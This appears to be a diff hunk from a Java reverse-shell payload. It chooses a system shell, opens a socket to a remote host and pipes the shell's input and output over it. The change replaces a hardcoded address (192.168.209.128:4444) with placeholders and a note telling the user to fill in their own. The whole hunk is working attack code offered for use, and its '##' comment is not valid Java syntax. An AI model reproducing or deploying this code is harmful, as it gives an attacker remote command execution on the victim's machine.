@@ -49,8 +49,8 @@ if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
 } else {
   ShellPath = new String("cmd.exe");
 }
-
-    Socket socket = new Socket( "192.168.209.128", 4444 );
+    
+    Socket socket = new Socket( "IP ADDR", PORT );   ##set_it_up_for_yourself
     Process process = Runtime.getRuntime().exec( ShellPath );
     ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
     ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
